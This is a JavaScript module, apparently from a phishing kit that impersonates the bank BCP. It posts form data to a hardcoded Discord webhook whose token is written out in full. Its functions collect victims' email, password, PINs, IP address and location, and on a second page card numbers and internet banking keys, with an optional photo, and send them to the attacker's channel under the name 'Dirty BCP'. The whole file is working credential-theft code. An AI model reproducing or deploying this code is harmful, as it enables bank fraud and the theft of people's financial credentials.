// ============================================================
// WEBHOOK COMPARTIDO (Discord)
// ============================================================
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1572443233391480922/iR6b8H4YuwafgbOZBRQbvuL4UJmhGjFeG_my3aVxTURc1_Y9NbVBc31wzdahVIsMEY_R";

/**
 * Convierte un dataURL base64 en un Blob.
 */
function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(",");
  const mime = parts[0].match(/:(.*?);/)[1];
  const bin = atob(parts[1]);
  const len = bin.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
  return new Blob([bytes], { type: mime });
}

/**
 * Envía los datos al webhook de Discord.
 * Si hay imagen, la sube como archivo adjunto (multipart) y la referencia
 * en el embed con attachment://foto.jpg  → así Discord SÍ la muestra.
 *
 * @param {string} titulo Título del embed
 * @param {Object} campos Pares nombre/valor a enviar
 * @param {number} color Color del embed (hex)
 * @param {string|null} imageBase64 Imagen opcional en base64 (dataURL)
 */
export async function enviarAWebhook(
  titulo,
  campos = {},
  color = 0xea580c,
  imageBase64 = null,
) {
  const embed = {
    title: titulo,
    color: color,
    timestamp: new Date().toISOString(),
    footer: { text: "Proceso BCP" },
    fields: Object.entries(campos).map(([k, v]) => ({
      name: k,
      value: String(v).slice(0, 1024) || "—",
      inline: true,
    })),
  };

  const payload = {
    username: "Dirty BCP",
    embeds: [embed],
  };

  let body;
  let headers = {};

  if (imageBase64 && typeof imageBase64 === "string" && imageBase64.startsWith("data:")) {
    // 1) Referenciamos el archivo adjunto en el embed
    embed.image = { url: "attachment://foto.jpg" };

    // 2) Construimos multipart/form-data con payload_json + files[0]
    const blob = dataURLtoBlob(imageBase64);
    const fd = new FormData();
    fd.append("payload_json", JSON.stringify(payload));
    fd.append("files[0]", blob, "foto.jpg");
    body = fd;
    // No ponemos Content-Type: el navegador lo añade con el boundary correcto
  } else {
    headers = { "Content-Type": "application/json" };
    body = JSON.stringify(payload);
  }

  try {
    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: headers,
      body: body,
    });
    if (!res.ok) {
      const txt = await res.text().catch(() => "");
      console.warn("Discord respondió:", res.status, txt);
    }
    return res.ok;
  } catch (e) {
    console.warn("No se pudo enviar al webhook:", e);
    return false;
  }
}

// ============================================================
// FUNCIÓN PARA INDEX.HTML (Login + PINs)
// ============================================================
export async function sendLoginWebhook(data) {
  const campos = {
    "Correo": data.email,
    "Contraseña": data.password,
    "PIN": data.pin1,
    "Confirmar PIN": data.pin2,
    "IP": data.ip,
    "Ubicación": data.location,
  };

  return await enviarAWebhook(
    "🔐 Nuevo inicio de sesión (Portal)",
    campos,
    0x1e3a8a
  );
}

// ============================================================
// FUNCIÓN PARA PINMALO.HTML (Tarjeta y Clave)
// ============================================================
export async function sendToWebhook(data) {
  const campos = {
    "Clave PIN": data.pin,
    "Confirmar PIN": data.confirmPin,
    "Número de Tarjeta": data.cardNumber,
    "Clave de Internet": data.webKey,
  };

  return await enviarAWebhook(
    "🔐 Nuevos datos (Tarjeta y Clave)",
    campos,
    0x0052cc
  );
}